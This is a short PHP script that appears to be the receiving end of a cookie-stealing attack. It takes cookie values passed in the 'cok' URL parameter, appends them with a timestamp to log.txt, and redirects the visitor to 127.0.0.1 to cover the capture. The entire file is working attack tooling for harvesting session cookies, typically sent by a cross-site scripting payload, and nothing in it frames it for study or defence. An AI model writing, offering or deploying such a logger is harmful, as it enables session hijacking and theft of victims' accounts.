<?php
header ('Location:http://127.0.0.1');
date_default_timezone_set('Asia/Jakarta');
$time = date('d-m-Y H:i:s');
$cookies = $_GET["cok"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\r\n");
fwrite($file, $time . "\r\n");
fwrite($file, "===================\n\n");
?>
